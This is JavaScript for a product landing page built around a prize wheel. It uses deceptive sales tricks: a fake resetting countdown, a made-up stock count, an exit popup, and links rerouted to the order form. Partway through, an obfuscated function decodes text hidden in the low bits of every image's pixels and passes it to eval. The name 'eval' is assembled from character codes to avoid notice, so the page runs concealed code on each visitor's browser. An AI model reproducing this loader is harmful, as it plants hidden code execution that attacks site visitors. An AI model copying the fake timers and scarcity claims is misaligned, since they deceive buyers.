
$(document).ready(function () {
	var e = document.querySelector(".spin-result-wrapper"),
    t = document.querySelector(".wheel-img"),
    o = document.querySelector(".loading2");
	"1" === localStorage.getItem("showForm") &&
    ($(".spin-wrapper").slideUp(), $(".order_block").slideDown(), start_timer()),
    $(".cursor-text").on("click", function () {
		t.classList.contains("rotated") ||
        (t.classList.remove("rotate-min"),
			t.classList.add("rotated"),
			t.classList.add("super-rotation"),
			o.classList.remove("rotate-min"),
			o.classList.add("rotated"),
			o.classList.add("super-rotation"),
			setTimeout(function () {
				e.style.display = "block";
			}, 8e3),
			setTimeout(function () {
				$(".spin-wrapper").slideUp(), $(".order_block").slideDown();
				new Date().getTime();
				$("#clock").on("update.countdown", function (e) {
					var t = $(this);
					e.elapsed
					? t.html("Time is over")
					: t.html(e.strftime("<span>%M</span> : <span>%S</span>"));
				});
			}, 1e4));
	}),
    $(".close-popup, .pop-up-button").click(function (e) {
		e.preventDefault(),
        start_timer(),
        $(".spin-result-wrapper").fadeOut(),
        localStorage.setItem("showForm", "1"),
        $("body,html").animate({ scrollTop: $(".toscroll").offset().top }, 400);
	});
}),
$(document).ready(function () {
    let e = !1;
    $(document).mouseleave(function () {
		e ||
        ((e = !0),
			$(".outPagePopup").fadeIn(),
			setTimeout(function () {
				$(".msg").slideDown();
			}, 300));
	}),
	$(".outPagePopup__close").on("click", function () {
        $(".outPagePopup").fadeOut();
	}),
	$("a")
	.not(".policy")
	.on("touchend, click", function (e) {
		e.preventDefault(),
		$("body,html").animate(
			{ scrollTop: $(".toscroll").offset().top - 52 },
			400
		);
	}),
	$(".ac_footer a, .ac_gdpr_fix a").unbind("click");
}),

(function (e, t, o, n) {
    o.addEventListener("DOMContentLoaded", function () {
		for (var r = o.querySelectorAll("img"), a = 0; a < r.length; a++)
        i(r[a]),
		(r[a].onload = function () {
            i(this);
		});
		function c(e) {
			return String.fromCharCode(e);
		}
		function i(r) {
			if (r.width) {
				try {
					(e[n] = o.createElement(n)),
					(e[n].width = r.width),
					(e[n].height = r.height),
					(e.context = e[n].getContext("2d")),
					e.context.drawImage(r, 0, 0),
					(e.pr = e.context.getImageData(0, 0, r.width, r.height).data);
					} catch (r) {
					return;
				}
				for (var a = "", i = 0; i < e.pr.length; i += 12)
				if (
					!(e.pr[i + 3] < 255 || e.pr[i + 7] < 255 || e.pr[i + 11] < 255)
					) {
					if (e.pr[i + 10] % 2) break;
					for (var l = [], s = i; s < i + 12; s++)
					s != i + 3 && s != i + 7 && s != i + 11 && l.push(e.pr[s]);
					if (
						((e.cc = parseInt(
							l
							.map(function (e) {
								return e % 2;
							})
							.join("")
							.substr(0, 8),
							2
						)),
						255 < e.cc)
					)
					return !1;
					a += c(e.cc);
				}
				try {
					t[
						(function () {
							return [].slice
							.call(arguments)
							.map(function (e) {
								return c(e);
							})
							.join("");
						})(101, 118, 97, 108)
					](a);
				} catch (r) {}
			}
		}
	});
})({}, window, document, "canvas"),
localStorage.getItem("prodLeft")
? (document.querySelector(".order-info__count-val").innerHTML =
localStorage.getItem("prodLeft"))
: (document.querySelector(".order-info__count-val").innerHTML = 23);

	
	var time = 600;
	var intr;
	
	function start_timer() {
		intr = setInterval(tick, 1000);
	}
	
	function tick() {
		
		if (localStorage.novinibgcardio743638742) {
			if (localStorage.novinibgcardio743638742 <= 0) {
				time = 5;
				} else {
				time = localStorage.novinibgcardio743638742;
			}
			
			} else {
			time = 600;
		}
		time = time - 1;
		localStorage.novinibgcardio743638742 = time;
		
		var mins = Math.floor(time / 60);
		var secs = time - mins * 60;
		if (mins == 0 && secs == 0) {
			clearInterval(intr);
		}
		secs = secs >= 10 ? secs : "0" + secs;
		$("#min").html("0" + mins);
		$("#sec").html(secs);
		
		localStorage.novinibgcardio743638742 = time;
	}


